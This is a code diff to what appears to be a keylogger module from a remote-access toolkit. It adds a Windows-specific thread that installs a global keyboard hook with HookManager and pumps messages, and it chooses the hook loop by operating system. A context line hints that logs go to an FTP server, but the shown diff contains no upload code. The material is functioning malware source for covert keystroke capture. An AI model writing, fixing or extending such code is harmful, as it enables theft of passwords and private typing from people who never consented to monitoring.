@@ -42,6 +42,7 @@ or an FTP server
 
 # main
 def _event(event):
+    global logs
     global window
     try:
         if event.WindowName != window:
@@ -59,8 +60,18 @@ def _event(event):
         else:
             pass
     except Exception as e:
-        util.log('{} error: {}'.format(event.__name__, str(e)))
+        print('{} error: {}'.format(event.__name__, str(e)))
     return True
+
+def _run_windows():
+    global abort
+    while True:
+        hm = hook_manager.HookManager()
+        hm.KeyDown = _event
+        hm.HookKeyboard()
+        pythoncom.PumpMessages()
+        if abort:
+            break
 
 def _run():
     global abort
@@ -68,9 +79,9 @@ def _run():
         hm = hook_manager.HookManager()
         hm.KeyDown = _event
         hm.HookKeyboard()
-        pythoncom.PumpMessages() if os.name == 'nt' else time.sleep(0.1)
+        time.sleep(0.1)
         if abort:
-            break
+            break   
 
 def run():
     """
@@ -80,7 +91,10 @@ def run():
     global threads
     try:
         if 'keylogger' not in threads or not threads['keylogger'].is_alive():
-            threads['keylogger'] = threading.Thread(target=_run, name=time.time())
+            if os.name == 'nt':
+                threads['keylogger'] = threading.Thread(target=_run_windows, name=time.time())
+            else:
+                threads['keylogger'] = threading.Thread(target=_run, name=time.time())
         return threads['keylogger']
     except Exception as e:
         util.log(str(e))
